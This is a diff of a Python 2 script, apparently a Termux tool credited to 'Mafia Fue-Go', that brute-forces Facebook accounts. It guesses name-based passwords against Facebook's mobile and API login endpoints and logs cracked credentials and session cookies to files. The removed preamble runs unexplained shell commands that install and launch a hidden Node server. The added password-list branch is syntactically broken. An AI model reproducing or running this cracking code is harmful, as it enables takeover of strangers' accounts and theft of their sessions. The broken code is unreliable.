@@ -1,63 +1,5 @@
 # -*- coding: utf-8
 # author by Mafia Fue-Go
-try:
-
-    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
-
-    from multiprocessing.pool import ThreadPool
-
-except ImportError:
-
-    os.system("pip2 install requests")
-
-    os.system("python2 cracker.indirect")
-    
-os.system("clear")
-
-
-
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
-
-    os.system("apt update && apt install nodejs -y")
-
-from requests.exceptions import ConnectionError
-
-os.system("git pull")
-
-if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
-
-    os.system("fuser -k 5000/tcp &")
-
-    os.system("cd ..... && pip install progress")
-
-    os.system("cd ..... && npm install")
-
-    os.system("cd ..... && node index.js &")
-
-    os.system("clear")
-
-    time.sleep(10)
-
-elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):
-
-    os.system("fuser -k 5000/tcp &")
-
-    os.system("#")
-
-    os.system("cd ..... && node index.js &")
-
-    os.system("clear")
-
-bd=random.randint(2e7, 3e7)
-
-sim=random.randint(2e4, 4e4)
-
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
-
-reload(sys)
-
-sys.setdefaultencoding("utf-8")
-
 import os
 try:
 	import requests
@@ -379,13 +321,14 @@ def bapi(user):
 	elif len(name)<=2:
 		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
+		pwx = [ 668844, name+"111", name+"222", name+"333", name+"444", name+"555", name+"666", name+"777", name+"888", name+"999" ]
+	else:
 		pwx = [ name, name+"2004", name+"2003", name+"2001", name+"2002", name+"2000" ]
-   else:
-		pwx = [ 668844, name+"111", name+"222", name+"333", name+"444", name+"555" ]
-   else: 
-		pwx = [ 112233, 123456, 102030, 223344, 445566, 556677, 778899, 468903, 780325 ]
-   else:
-		pwx = [ 786786, 000786, 000123, 000456, 000789 , 000678, 457625, 67893, 998833 ]
+		else:
+			pwx = [ 786786, 000786, 000123, 000456, 000789 , 000678, 457625, 67893, 998833 ]
+			else:
+				pwx = [ 112233, 123456, 102030, 223344, 445566, 556677, 778899, 468903, 780325 ]
+				else:
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -393,13 +336,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, send.json()[""]))
+				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;93m[FUEGO-CP] %s|%s "%(uid, pw))
+				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -497,13 +440,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;93m[FUEGO-CP] %s|%s"%(uid, pw))
+				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -519,16 +462,16 @@ def manual():
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
-	print("\n[+] Enter passwords of your own : ")
+	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
 	asu = raw_input("[+] Enter Passwords : ").split(",")
 	if len(asu) =="":
 		exit("[+] Wrong Input")
-	print("[+] Enter 2-4 Passwords for fast cracking speed\n")
+	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")
 
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-			"\r\033[0;92m[\033[1;92mcracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+			"\r\033[0;92m[\033[1;92mCracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
@@ -549,13 +492,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[1;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, kuki))
+					print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[1;93m[FUEGO-CP] %s|%s"%(uid, pw))
+					print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
@@ -575,12 +518,12 @@ def setting_ua():
 	if ua =="":
 		menu()
 	elif ua == "1":
-		print("\033[1;93m [+] IPHONE  ")
-		print(" [+] SAMSUNG  ")
-		print(" [+] XIAOMI ")
-		print(" [+] NOKIA  ")
-		print(" [+] LINUX ")
-		c_ua = raw_input("\033[1;97m [+] Enter User-Agent : ")
+		c_ua = raw_input(" [+] Enter User-Agent : ")
+		c_ua = raw_input(" [+] IPHONE  : ")
+		c_ua = raw_input(" [+] SAMSUNG : ")
+		c_ua = raw_input(" [+] XIAOMI: ")
+		c_ua = raw_input(" [+] NOKIA : ")
+		c_ua = raw_input(" [+] LINUX: ")
 		open(".ua", "w").write(c_ua)
 		time.sleep(1)
 		raw_input("\n [!] Press 'Enter' to save User-Agent")
